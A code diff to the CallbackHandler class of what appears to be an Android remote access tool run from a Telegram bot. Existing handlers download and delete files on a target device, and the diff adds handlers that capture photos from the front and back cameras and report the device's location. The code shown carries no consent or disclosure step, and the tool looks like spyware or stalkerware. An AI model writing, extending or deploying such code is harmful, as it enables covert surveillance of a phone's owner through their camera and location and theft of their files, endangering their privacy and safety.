@@ -39,6 +39,15 @@ class CallbackHandler(
                 Cb.FILE_DEL -> handleFileDelete(targetDeviceId, extraData, messageId, bot)
                 Cb.FOLDER_DL -> handleFolderDownload(targetDeviceId, extraData, messageId, bot)
                 Cb.FOLDER_DEL -> handleFolderDelete(targetDeviceId, extraData, messageId, bot)
+                // Camera
+                Cb.CAMERA -> handleCameraMenu(targetDeviceId, messageId, bot)
+                Cb.CAM_BACK -> handleCaptureBackCamera(targetDeviceId, messageId, bot)
+                Cb.CAM_FRONT -> handleCaptureFrontCamera(targetDeviceId, messageId, bot)
+                Cb.CAM_BOTH -> handleCaptureBothCameras(targetDeviceId, messageId, bot)
+                // Location
+                Cb.LOCATION -> handleLocationMenu(targetDeviceId, messageId, bot)
+                Cb.LOC_GET -> handleGetLocation(targetDeviceId, messageId, bot)
+                // Navigation
                 Cb.BACK_DEV -> handleBackToDevices(messageId, bot)
                 Cb.BACK_MENU -> handleBackToMenu(targetDeviceId, messageId, bot)
                 Cb.CANCEL -> handleCancelOperation(messageId, bot)
@@ -335,6 +344,132 @@ class CallbackHandler(
             )
         )
         commandExecutor.executeDeleteFile(path)
+    }
+
+    // Camera handlers
+    private fun handleCameraMenu(deviceId: String, messageId: Int?, bot: TelegramBot) {
+        stateManager.saveStateData("current_device_id", deviceId)
+        bot.editMessageText(
+            messageId,
+            buildString {
+                append("📷 <b>Camera Capture</b>\n")
+                append("━━━━━━━━━━━━━━━━━━\n\n")
+                append("Choose a camera to capture:")
+            },
+            parseMode = "HTML",
+            replyMarkup = keyboardBuilder.createInlineKeyboard(
+                keyboardBuilder.getCameraSubMenuButtons(deviceId)
+            )
+        )
+    }
+
+    private fun handleCaptureBackCamera(deviceId: String, messageId: Int?, bot: TelegramBot) {
+        if (!DeviceManager.isThisDevice(context, deviceId)) {
+            bot.editMessageText(
+                messageId,
+                "❌ <b>Remote Access Unavailable</b>",
+                parseMode = "HTML",
+                replyMarkup = keyboardBuilder.createInlineKeyboard(
+                    listOf(listOf("◀️ Back" to "${Cb.BACK_MENU}:$deviceId"))
+                )
+            )
+            return
+        }
+        bot.editMessageText(
+            messageId,
+            "📷 <b>Capturing Back Camera</b>\n\n<i>Please wait...</i>",
+            parseMode = "HTML",
+            replyMarkup = keyboardBuilder.createInlineKeyboard(
+                listOf(listOf("◀️ Back" to "${Cb.CAMERA}:$deviceId"))
+            )
+        )
+        commandExecutor.executeCaptureBackCamera()
+    }
+
+    private fun handleCaptureFrontCamera(deviceId: String, messageId: Int?, bot: TelegramBot) {
+        if (!DeviceManager.isThisDevice(context, deviceId)) {
+            bot.editMessageText(
+                messageId,
+                "❌ <b>Remote Access Unavailable</b>",
+                parseMode = "HTML",
+                replyMarkup = keyboardBuilder.createInlineKeyboard(
+                    listOf(listOf("◀️ Back" to "${Cb.BACK_MENU}:$deviceId"))
+                )
+            )
+            return
+        }
+        bot.editMessageText(
+            messageId,
+            "📷 <b>Capturing Front Camera</b>\n\n<i>Please wait...</i>",
+            parseMode = "HTML",
+            replyMarkup = keyboardBuilder.createInlineKeyboard(
+                listOf(listOf("◀️ Back" to "${Cb.CAMERA}:$deviceId"))
+            )
+        )
+        commandExecutor.executeCaptureFrontCamera()
+    }
+
+    private fun handleCaptureBothCameras(deviceId: String, messageId: Int?, bot: TelegramBot) {
+        if (!DeviceManager.isThisDevice(context, deviceId)) {
+            bot.editMessageText(
+                messageId,
+                "❌ <b>Remote Access Unavailable</b>",
+                parseMode = "HTML",
+                replyMarkup = keyboardBuilder.createInlineKeyboard(
+                    listOf(listOf("◀️ Back" to "${Cb.BACK_MENU}:$deviceId"))
+                )
+            )
+            return
+        }
+        bot.editMessageText(
+            messageId,
+            "📷 <b>Capturing Both Cameras</b>\n\n<i>Please wait...</i>",
+            parseMode = "HTML",
+            replyMarkup = keyboardBuilder.createInlineKeyboard(
+                listOf(listOf("◀️ Back" to "${Cb.CAMERA}:$deviceId"))
+            )
+        )
+        commandExecutor.executeCaptureBothCameras()
+    }
+
+    // Location handlers
+    private fun handleLocationMenu(deviceId: String, messageId: Int?, bot: TelegramBot) {
+        stateManager.saveStateData("current_device_id", deviceId)
+        bot.editMessageText(
+            messageId,
+            buildString {
+                append("📍 <b>Location</b>\n")
+                append("━━━━━━━━━━━━━━━━━━\n\n")
+                append("Choose an action:")
+            },
+            parseMode = "HTML",
+            replyMarkup = keyboardBuilder.createInlineKeyboard(
+                keyboardBuilder.getLocationSubMenuButtons(deviceId)
+            )
+        )
+    }
+
+    private fun handleGetLocation(deviceId: String, messageId: Int?, bot: TelegramBot) {
+        if (!DeviceManager.isThisDevice(context, deviceId)) {
+            bot.editMessageText(
+                messageId,
+                "❌ <b>Remote Access Unavailable</b>",
+                parseMode = "HTML",
+                replyMarkup = keyboardBuilder.createInlineKeyboard(
+                    listOf(listOf("◀️ Back" to "${Cb.BACK_MENU}:$deviceId"))
+                )
+            )
+            return
+        }
+        bot.editMessageText(
+            messageId,
+            "📍 <b>Getting Location</b>\n\n<i>Please wait...</i>",
+            parseMode = "HTML",
+            replyMarkup = keyboardBuilder.createInlineKeyboard(
+                listOf(listOf("◀️ Back" to "${Cb.LOCATION}:$deviceId"))
+            )
+        )
+        commandExecutor.executeGetLocation()
     }
 
     private fun handleBackToDevices(messageId: Int?, bot: TelegramBot) {
